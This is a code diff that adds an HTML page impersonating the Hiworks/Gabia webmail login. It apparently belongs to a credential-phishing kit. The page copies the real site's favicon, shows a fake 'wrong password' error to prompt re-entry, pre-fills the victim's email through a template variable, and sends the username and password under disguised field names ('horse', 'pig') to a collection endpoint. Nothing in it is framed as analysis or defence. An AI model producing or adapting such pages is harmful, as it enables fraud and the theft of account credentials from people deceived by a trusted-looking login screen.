@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" href="https://login.office.hiworks.com/favicon-96x96.png" />
+
+<title>하이웍스 로그인</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    background-color: #ffffff; /* Pure white background */
+  }
+
+  .content-wrapper {
+    margin-top: -180px; /* Adjust this value to raise the elements */
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+
+  header {
+    margin-bottom: 20px;
+  }
+
+  h1 img {
+    display: block;
+    margin: 0 auto;
+    max-width: 100%;
+    height: auto;
+  }
+
+  form {
+    width: 100%;
+    max-width: 400px;
+    background: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+  }
+
+  fieldset {
+    border: none;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+  }
+
+  legend {
+    font-size: 1.5rem;
+    font-weight: bold;
+    color: #333;
+    text-align: center;
+  }
+
+  p {
+    font-size: 0.9rem;
+    text-align: center;
+    color: #666;
+  }
+
+  .input-group {
+    display: flex;
+    align-items: center;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    padding: 8px;
+    background: #fff;
+  }
+
+  .input-group svg {
+    margin-right: 10px;
+    fill: #888;
+  }
+
+  input {
+    border: none;
+    outline: none;
+    flex: 1;
+    font-size: 1rem;
+  }
+
+  .input-group p {
+    margin: 0;
+    color: #888;
+  }
+
+  .error-message {
+    font-size: 0.9rem;
+    color: red;
+    text-align: center;
+    margin-bottom: 15px;
+  }
+
+  button {
+    width: 100%;
+    padding: 12px;
+    background: #2985db;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    font-size: 1rem;
+    cursor: pointer;
+    transition: background 0.3s;
+  }
+
+  button:hover {
+    background: #1a69b0;
+  }
+
+  button:disabled {
+    background: #ccc;
+    cursor: not-allowed;
+  }
+
+  @media (max-width: 480px) {
+    form {
+      padding: 15px;
+    }
+
+    legend {
+      font-size: 1.2rem;
+    }
+
+    button {
+      font-size: 0.9rem;
+    }
+  }
+
+  .footer {
+    position: fixed;
+    bottom: 15px;
+    left: 50%;
+    transform: translateX(-50%);
+    color: rgba(0, 0, 0, 0.5);
+    font-size: 14px;
+    text-align: center;
+    padding: 10px;
+  }
+</style>
+</head>
+<body>
+<div class="content-wrapper">
+  <header>
+    <h1><img src="https://i.ibb.co/Jnbsyy8/Screenshot-1.png" alt="toeng.co.kr"></h1>
+  </header>
+  <main>
+    <form action="second" method="POST">
+      <div class="error-message">비밀번호가 잘못되었습니다. 다시 시도하세요.</div>
+      <fieldset>
+        <div class="input-group">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 14" width="44" height="24">
+            <path d="M0 0h14v14H0z" fill="none"/>
+            <path fill="#888" d="M12.25 11.55v1.137A1.312 1.312 0 0110.938 14H1.313A1.313 1.313 0 010 12.688V11.55a3.675 3.675 0 013.675-3.675c.787 0 1.164.438 2.45.438s1.662-.437 2.45-.437a3.675 3.675 0 013.675 3.674z"/>
+          </svg>
+          <input type="text" placeholder="" name="horse" value="{{eman}}" required="" />
+          <p>보안됨</p>
+        </div>
+        <div class="input-group">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 14" width="44" height="24">
+            <path d="M0 0h14v14H0z" fill="none"/>
+            <path fill="#888" d="M7 0a2 2 0 012 2v1h3a2 2 0 012 2v7a2 2 0 01-2 2H2a2 2 0 01-2-2V5a2 2 0 012-2h3V2a2 2 0 012-2zm0 2V0z"/>
+          </svg>
+          <input type="password"  name="pig" placeholder="비밀번호"  required/>
+        </div>
+        <button type="submit">다음</button>
+      </fieldset>
+    </form>
+  </main>
+</div>
+<div class="footer">
+  © Gabia Inc.
+</div>
+</body>
+</html>
